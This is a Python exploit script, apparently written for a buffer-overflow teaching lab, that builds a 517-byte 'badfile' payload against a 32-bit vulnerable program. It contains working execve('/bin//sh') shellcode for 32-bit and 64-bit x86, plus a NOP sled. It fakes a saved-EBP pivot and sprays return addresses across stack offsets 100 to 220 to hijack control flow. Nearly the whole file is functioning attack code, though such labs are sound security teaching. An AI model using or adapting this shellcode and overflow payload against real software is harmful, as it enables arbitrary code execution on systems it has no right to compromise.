#!/usr/bin/python3
import sys

""" This code constructs a payload to be read into the buffer
and writes the binary payload to "badfile".

First we construct the payload entirely of NOPs to serve as a
nopsled into our shellcode. Next, we insert the shellcode into
the payload. Finally, we insert a return address that will 
instruct the vulnerable program to execute instructions in the 
payload.
"""

# You can use this function to print out your payload in bytes.
# It is not necessary to use this, but it may help you debug.
def bytes_to_hex(arr):
	print(''.join('{:02x}'.format(x) for x in arr))

# Replace the payload with the actual shellcode
shellcode= (
  "\x90\x90\x90\x90"
  "\x90\x90\x90\x90"
).encode('latin-1')

#Copied from call_shellcode.c
# 32-bit execve("/bin//sh") shellcode (no nulls)
shell_code_x86_32 = (
    b"\x31\xdb\x31\xc0\xb0\xd5\xcd\x80"
    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
    b"\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
    b"\xd2\x31\xc0\xb0\x0b\xcd\x80"
)

# 64-bit execve("/bin//sh") shellcode (no nulls)
shell_code_x86_64 = (
    b"\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e"
    b"\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57"
    b"\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
)

# Choose the correct shellcode for the target
# For your Level-1 32-bit lab target:
shellcode = shell_code_x86_32

# Fill the payload with NOP's
PAYLOAD_LEN = 517
slack_after_shellcode = 8
payload = bytearray(0x90 for i in range(PAYLOAD_LEN))

# Put the shellcode somewhere in the payload
start = PAYLOAD_LEN - len(shellcode) - slack_after_shellcode
payload[start:start + len(shellcode)] = shellcode


L = 4 	# Use 4 for 32-bit address and 8 for 64-bit address
      	# You don't need to change this for this lab.
#Inputs
buffer_addr = 0xffffc3d8
ebp = 0xffffc498 #output of: p/x $ebp
saved_ebp_val = 0xffffc8a8   # output of: p/x *(unsigned int*)($ebp)  (saved EBP)


#Task 4 (Logics) modifications here: Calculate without knowing buffer size
SLED_LEN = 256
sled_mid = SLED_LEN // 2
#Computation
saved_ebp_index = ebp - buffer_addr   #192
saved_eip_index = saved_ebp_index + 4 #196
ret = (buffer_addr + sled_mid) & 0xffffffff   #Why the & with 0xffffffff? To ensure it's a 32-bit address


pivot = 32   # you can try 16, 32, 48 if needed


# 1) Put fake saved-EBP at payload[pivot : pivot+4] (so pop ebp yields a valid chain)
payload[pivot : pivot+4] = ((saved_ebp_val & 0xffffffff).to_bytes(4, byteorder='little'))

# 2) Put the desired RET (address to jump into sled) at payload[pivot+4 : pivot+8]
payload[pivot+4 : pivot+8] = ((ret & 0xffffffff).to_bytes(4, byteorder='little'))

# 3) Overwrite the saved-EBP slot (on stack) with buffer_addr + pivot so leave sets esp there
payload[saved_ebp_index : saved_ebp_index + 4] = (((buffer_addr + pivot) & 0xffffffff).to_bytes(4, byteorder='little'))

# ---- NEW: Address spray (robustness for non-gdb run) ----
# Write the same 'ret' repeatedly across the common saved-EIP offset range so
# small differences between gdb and normal run won't break us.
# This range (100..220) covers the lab's buffer-size uncertainty (100..200).
spray_start = 100
spray_end   = 220
step = 4   # word-aligned writes; set to 1 (byte) if you want denser coverage and more space usage
ret = buffer_addr + 0xe0  # NOP-sled center
for off in range(spray_start, spray_end + 1, step):
    # Bound-check: don't write past payload
    if off + 3 < PAYLOAD_LEN:
        payload[off:off+4] = (ret & 0xffffffff).to_bytes(4, byteorder='little')
        # payload[off:off+4] = (((buffer_addr + pivot) & 0xffffffff).to_bytes(4, byteorder='little'))
      
payload[saved_ebp_index : saved_ebp_index + 4] = (((buffer_addr + pivot) & 0xffffffff).to_bytes(4, byteorder='little'))

# Write the payload to a file
with open('badfile', 'wb') as f:
  f.write(payload)
